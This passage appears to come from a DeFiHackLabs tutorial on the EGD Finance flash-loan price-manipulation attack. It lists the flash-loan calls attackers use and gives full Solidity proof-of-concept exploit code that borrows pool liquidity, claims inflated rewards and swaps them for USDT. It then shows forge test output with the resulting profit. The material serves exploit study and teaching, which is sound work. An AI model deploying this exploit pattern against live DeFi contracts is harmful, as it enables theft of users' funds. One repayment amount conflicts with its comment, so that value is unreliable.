* Upon an attack incident, it is important to gather and organize the newest information. Here is a template!
  1. Transaction ID
  2. Attacker Address(EOA)
  3. Attack Contract Address
  4. Vulnerable Address
  5. Total Loss
  6. Reference Links
  7. Post-mortem Links
  8. Vulnerable snippet
  9. Audit History

> Protip: Use the [Exploit-Template.sol](/script/Exploit-template.sol) template from DeFiHackLabs.
>
> > Please note, internal function calls[^2] are not visible in Ethereum EVM.
[^2]: Internal function calls are invisible to the blockchain since they don't create any new transactions or blocks. In this way, they cannot be read by other smart contracts or show up in the blockchain transaction history.
* Further Information - Attackers Flash loan attack mode
  1. Check if the attack will be profitable. First, ensure loans can be obtained, then ensure the target has enough balance.
     - This means you will see some 'static calls' in the beginning.
  2. Use DEX or Lending Protocols to obtain a flash loan, look for the following key function calls
     - UniswapV2, Pancakeswap: `.swap()`
     - Balancer: `flashLoan()`
     - DODO: `.flashloan()`
     - AAVE: `.flashLoan()`
  3. Callbacks from flash loan protocol to attacker’s contract, look for the following key function calls
        - UniswapV2: `.uniswapV2Call()`
        - Pancakeswap: `.Pancakeswap()`
        - Balancer: `.receiveFlashLoan()`
        - DODO: `.DXXFlashLoanCall()`
        - AAVE: `.executeOperation()`
   4. Execute the attack to profit from contract weakness.
   5. Return the flash loan
**Conclusion:  The attacker used a flash loan to alter the liquidity of the EGD/USDT trading pair, resulting in `ClaimReward()` getting an incorrect price, allowing the attacker to obtain an obscene amount of EGD tokens.**

Finally, the attacker exchanged EGD Token using Pancakeswap for USDT, thus profiting from the attack.


---
### Step 5: Reproduce
Now that we’ve fully understood the attack, let's reproduce it:

Step D. Write the PoC code for the attack

<details><summary>Click to show the code</summary>

```solidity=
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // attack contract
    uint256 borrow1;
    uint256 borrow2;


    function harvest() public {        
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //Profit realization
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        if(keccak256(data) == keccak256("0000")) {
            console.log("Flashloan[1] received");

            console.log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve");
            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9999999925 / 10000000000; //The attacker lends 99.99999925% of the USDT liquidity of the EGD_USDT_LPPool.
            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00"); // Borrow Flashloan[2]
            console.log("Flashloan[2] payback success");

            // 漏洞利用結束, 把盜取的 EGD Token 換成 USDT
            console.log("Swap the profit...");
            address[] memory path = new address[](2);
            path[0] = egd;
            path[1] = usdt;
            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(egd).balanceOf(address(this)),
                1,
                path,
                address(this),
                block.timestamp
            );

            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //The attacker repays 2,000 USDT + 0.5% service fee.
            require(suc, "Flashloan[1] payback failed");
        } else {
            console.log("Flashloan[2] received");
            // Exploitation...
        }


    }
}
```

</details>
<br>



Step E. Write the PoC code for the second flash loan using the exploit

<details><summary>Click to show the code</summary>

```solidity=
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // attack contract
    uint256 borrow1;
    uint256 borrow2;


    function harvest() public {        
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //Gaining profit
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        if(keccak256(data) == keccak256("0000")) {
            console.log("Flashloan[1] received");

            console.log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve");
            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9999999925 / 10000000000; //The attacker lends 99.99999925% of the USDT liquidity of the EGD_USDT_LPPool.
            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00"); // Borrow Flashloan[2]
            console.log("Flashloan[2] payback success");

            // Exchange the stolen EGD Token for USDT after the exploit is over.
            console.log("Swap the profit...");
            address[] memory path = new address[](2);
            path[0] = egd;
            path[1] = usdt;
            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(egd).balanceOf(address(this)),
                1,
                path,
                address(this),
                block.timestamp
            );

            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //The attacker repays 2,000 USDT + 0.5% service fee.
            require(suc, "Flashloan[1] payback failed");
        } else {
            console.log("Flashloan[2] received");
            emit log_named_decimal_uint("[INFO] EGD/USDT Price after price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
            // -----------------------------------------------------------------
            console.log("Claim all EGD Token reward from EGD Finance contract");
            IEGD_Finance(EGD_Finance).claimAllReward();
            emit log_named_decimal_uint("[INFO] Get reward (EGD token)", IERC20(egd).balanceOf(address(this)), 18);
            // -----------------------------------------------------------------
            uint256 swapfee = amount1 * 3 / 1000;   // Attacker pay 0.3% fee to Pancakeswap
            bool suc = IERC20(usdt).transfer(address(EGD_USDT_LPPool), amount1+swapfee);
            require(suc, "Flashloan[2] payback failed");         
        }
    }
}
/* -------------------- Interface -------------------- */
interface IEGD_Finance {
    function calculateAll(address addr) external view returns (uint);
    function claimAllReward() external;
    function getEGDPrice() external view returns (uint);
}
```

</details>
<br>

Step F.Execute the code with `forge test --contracts ./src/test/EGD-Finance.exp.sol -vvv`Pay attention to the change in balances.

[DeFiHackLabs - EGD-Finance.exp.sol](https://github.com/finn79426/DeFiHackLabs/blob/main/src/test/EGD-Finance.exp.sol)

```
Running 1 test for src/test/EGD-Finance.exp.sol:Attacker
[PASS] testExploit() (gas: 537204)
Logs:
  --------------------  Pre-work, stake 10 USDT to EGD Finance --------------------
  Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8
  Attacker Stake 10 USDT to EGD Finance
  -------------------------------- Start Exploit ----------------------------------
  [Start] Attacker USDT Balance: 0.000000000000000000
  [INFO] EGD/USDT Price before price manipulation: 0.008096310933284567
  [INFO] Current earned reward (EGD token): 0.000341874999999972
  Attacker manipulating price oracle of EGD Finance...
  Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve
  Flashloan[1] received
  Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve
  Flashloan[2] received
  [INFO] EGD/USDT Price after price manipulation: 0.000000000060722331
  Claim all EGD Token reward from EGD Finance contract
  [INFO] Get reward (EGD token): 5630136.300267721935770000
  Flashloan[2] payback success
  Swap the profit...
  Flashloan[1] payback success
  -------------------------------- End Exploit ----------------------------------
  [End] Attacker USDT Balance: 18062.915446991996902763

Test result: ok. 1 passed; 0 failed; finished in 1.66s
```


Note: EGD-Finance.exp.sol from DeFiHackLabs includes a preemptive step which is staking.

This write-up does not include this step, feel free to try it yourself! 
